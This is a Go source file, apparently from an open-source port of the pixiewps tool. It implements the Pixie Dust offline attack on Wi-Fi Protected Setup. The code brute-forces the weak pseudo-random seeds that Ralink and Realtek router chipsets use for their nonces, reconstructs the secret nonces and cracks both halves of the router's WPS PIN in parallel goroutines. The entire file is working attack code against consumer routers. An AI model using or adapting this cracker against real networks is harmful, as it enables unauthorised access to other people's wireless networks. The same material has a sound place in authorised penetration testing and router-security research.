/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package pixiedust

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"sync"
	"sync/atomic"
)


const (
    seedsPerJobBlock = 1000
    mode3Tries       = 60 * 10
)


type JobControl struct {
    jobs          int
    mode          int
    end           uint32
    randREnonce   [4]uint32
    rawEnonce     []byte
    pda          *pixieDustAttack
    crackJobs     []CrackJob
    nonceSeed     uint32    // atomic
}


type CrackJob struct {
    start uint32
}



func (pda *pixieDustAttack) initCrackJobs(mode int) *JobControl {
    jc := &JobControl{
        pda         : pda,
        jobs        : pda.jobs,
        mode        : mode,
        end         : 0xFFFFFFFF,
        randREnonce : [4]uint32{},
    }

    jc.initData()
    return jc
}



func (jc *JobControl) initData() {
	if jc.mode == rtl819x {
        jc.end = uint32(jc.pda.end)
        jc.wordForRTL819x()
    } else {
        jc.rawEnonce = make([]byte, len(jc.pda.eNonce))
        copy(jc.rawEnonce, jc.pda.eNonce)
    }

    jc.crackJobs = make([]CrackJob, jc.pda.jobs)

    var curr uint32
    var add int32

    switch jc.mode {
    case rtl819x  : curr, add = uint32(jc.pda.start), -seedsPerJobBlock
    case rt       : curr, add = 1, seedsPerJobBlock
    case -rtl819x : curr, add = 1, 1 
    }

    for i := 0; i < jc.pda.jobs; i++ {
        if jc.mode == -rtl819x {
            jc.crackJobs[i].start = uint32(i + 1)
        } else {
            jc.crackJobs[i].start = curr
            curr += uint32(add)
        }
    }
}



func (jc *JobControl) wordForRTL819x() {
    for i := range 4 {
        var word uint32
        idx := i * 4
        
        word |= uint32(jc.pda.eNonce[idx]) << 24
        word |= uint32(jc.pda.eNonce[idx+1]) << 16
        word |= uint32(jc.pda.eNonce[idx+2]) << 8
        word |= uint32(jc.pda.eNonce[idx+3])
        
        jc.randREnonce[i] = word
    }
}



func (jc *JobControl) collectCrackJobs() uint32 {
    atomic.StoreUint32(&jc.nonceSeed, 0)

    var wg sync.WaitGroup
    wg.Add(jc.jobs)

    for i := 0; i < jc.jobs; i++ {
        go func(job *CrackJob) {
            defer wg.Done()

			switch jc.mode {
			case rtl819x  : jc.crackRTL819xSeed(job)
			case rt       : jc.crackRTSeed(job)
            case -rtl819x : jc.crackRTLESSeed(job)
			}
        }(&jc.crackJobs[i])
    }

    wg.Wait()
    return atomic.LoadUint32(&jc.nonceSeed)
}



func (jc *JobControl) crackRTL819xSeed(job *CrackJob) {
    seed  := job.start
    limit := jc.end

    for atomic.LoadUint32(&jc.nonceSeed) == 0 {
        if glibcFastSeed(seed) == jc.randREnonce[0] {
            nonce := glibcFastNonce(seed)

            if bytes.Equal(nonce, jc.pda.eNonce) {
                atomic.CompareAndSwapUint32(&jc.nonceSeed, 0, seed)
                fmt.Printf("[$] Seed found (%10d)\n", seed)
                return
            }
        }

        if seed == 0 { break }
        seed--

        if seed < job.start-seedsPerJobBlock {
            tmp := int64(job.start) - int64(seedsPerJobBlock) * int64(jc.jobs)
            
            if tmp < 0 { break }
            
            job.start = uint32(tmp)
            seed      = job.start
            
            if seed < limit { break }
        }
    }
}



func glibcFastSeed(seed uint32) uint32 {
    var word0 uint32 = 0

    // PWPS_UNERRING. Not used by default
    // if seed == 0x7fffffff { seed = 0x13f835f3 }
    // if seed == 0xfffffffe { seed = 0x5df735f1 }

    for j := 3; j < 31+3-1; j++ {
        word0 += seed * glibcSeedTbl[j]

        // seed = (16807 * seed) % 0x7fffffff
        p    := uint64(16807) * uint64(seed)
        p     = (p >> 31) + (p & 0x7fffffff)
        seed  = uint32((p >> 31) + (p & 0x7fffffff))
    }

    word0 += seed * glibcSeedTbl[33]
    return word0 >> 1
}



func glibcFastNonce(seed uint32) []byte {
    var word0, word1, word2, word3 uint32

    for j := range 31 {
        word0 += seed * glibcSeedTbl[j+3]
        word1 += seed * glibcSeedTbl[j+2]
        word2 += seed * glibcSeedTbl[j+1]
        word3 += seed * glibcSeedTbl[j+0]

        // seed = (16807 * seed) % 0x7fffffff
        p    := uint64(16807) * uint64(seed)
        p     = (p >> 31) + (p & 0x7fffffff)
        seed  = uint32((p >> 31) + (p & 0x7fffffff))
    }

    nonce := make([]byte, 16)
    
    binary.BigEndian.PutUint32(nonce[0:4],   word0 >> 1)
    binary.BigEndian.PutUint32(nonce[4:8],   word1 >> 1)
    binary.BigEndian.PutUint32(nonce[8:12],  word2 >> 1)
    binary.BigEndian.PutUint32(nonce[12:16], word3 >> 1)

    return nonce
}



func (jc *JobControl) crackRTSeed(job *CrackJob) {
    start := job.start

    for atomic.LoadUint32(&jc.nonceSeed) == 0 {
        end := start + seedsPerJobBlock
        
        if end > jc.end { end = jc.end }

        if seed, found := jc.crackRT(start, end); found {
            atomic.CompareAndSwapUint32(&jc.nonceSeed, 0, seed)
            fmt.Printf("[$] Seed found (%10d)\n", seed)
            return
        }

        tmp := uint64(start) + uint64(seedsPerJobBlock) * uint64(jc.jobs)

        if tmp > uint64(jc.end) { break }

        start = uint32(tmp)
    }
}



func (jc *JobControl) crackRT(start, end uint32) (uint32, bool) {
    searchNonce := make([]byte, wpsNonceLen)

    for i := 0; i < 4; i++ {
        binary.BigEndian.PutUint32(searchNonce[i*4:], jc.randREnonce[i])
    }

    for seed := start; seed < end; seed++ {
        state := seed

        var testNonce [wpsNonceLen]byte
        testNonce[0] = ralinkRandByte(&state)

        if testNonce[0] != searchNonce[0] {
            continue
        }
        
        for i := 1; i < 4; i++ {
            testNonce[i] = ralinkRandByte(&state)
        }
        
        if !bytes.Equal(testNonce[:4], searchNonce[:4]) {
            continue
        }

        for i := 4; i < wpsNonceLen; i++ {
            testNonce[i] = ralinkRandByte(&state)
        }

        if bytes.Equal(testNonce[:], searchNonce) {
            return seed, true
        }
    }

    return 0, false
}



func (jc *JobControl) crackRTLESSeed(job *CrackJob) {
    threadID := job.start
    maxDist  := uint32(mode3Tries + 1)
    nonceBuf := make([]byte, wpsSecretNonceLen)

    for dist := threadID; atomic.LoadUint32(&jc.nonceSeed) == 0 && dist < maxDist; dist += uint32(jc.jobs) {
        if jc.findRTLES1(nonceBuf, jc.pda.nonceSeed+uint32(dist)) {
            seed := jc.pda.nonceSeed + uint32(dist)
            atomic.CompareAndSwapUint32(&jc.nonceSeed, 0, seed)
            copy(jc.pda.eSecret1, nonceBuf)
            break
        }

        if atomic.LoadUint32(&jc.nonceSeed) != 0 {
            break
        }

        if dist > 0 && jc.findRTLES1(nonceBuf, jc.pda.nonceSeed - uint32(dist)) {
            seed := jc.pda.nonceSeed - uint32(dist)
            atomic.CompareAndSwapUint32(&jc.nonceSeed, 0, seed)
            copy(jc.pda.eSecret1, nonceBuf)
            break
        }
    }
}



func (jc *JobControl) findRTLES1(nonceBuf []byte, seed uint32) bool {
    rtlNonceFill(nonceBuf, seed)
    jc.pda.crackFirstHalf(nonceBuf)
    return jc.pda.firstHalf != -1
}



func rtlNonceFill(nonce []byte, seed uint32) {
    var word0, word1, word2, word3 uint32
    s := seed

    for j := 0; j < 31; j++ {
        word0 += s * glibcSeedTbl[j+3]
        word1 += s * glibcSeedTbl[j+2]
        word2 += s * glibcSeedTbl[j+1]
        word3 += s * glibcSeedTbl[j+0]

        // seed = (16807 * seed) % 0x7fffffff
        p := uint64(16807) * uint64(s)
        p = (p >> 31) + (p & 0x7fffffff)
        s = uint32((p >> 31) + (p & 0x7fffffff))
    }

    binary.BigEndian.PutUint32(nonce[0:4],   word0 >> 1)
    binary.BigEndian.PutUint32(nonce[4:8],   word1 >> 1)
    binary.BigEndian.PutUint32(nonce[8:12],  word2 >> 1)
    binary.BigEndian.PutUint32(nonce[12:16], word3 >> 1)
}



func (pda *pixieDustAttack) findRTLES() bool {
    jc := &JobControl{
        pda:  pda,
        jobs: pda.jobs,
        mode: -rtl819x,
    }

    jc.initData()
    nonceBuf := make([]byte, wpsSecretNonceLen)

    if jc.findRTLES1(nonceBuf, pda.nonceSeed) {
        atomic.StoreUint32(&jc.nonceSeed, pda.nonceSeed)
        copy(pda.eSecret1, nonceBuf)
    }

    jc.collectCrackJobs()

    if jc.nonceSeed != 0 {
        pda.s1Seed  = jc.nonceSeed
        pinCopy    := pda.firstHalf

        for j := 0; j < 10; j++ {
            pda.firstHalf = pinCopy 

            rtlNonceFill(pda.eSecret2, pda.s1Seed+uint32(j))
            pda.crackSecondHalf()
            
            if pda.secondHalf != -1 {
                pda.s2Seed = pda.s1Seed + uint32(j)
                return true
            }
        }
    }

    return false
}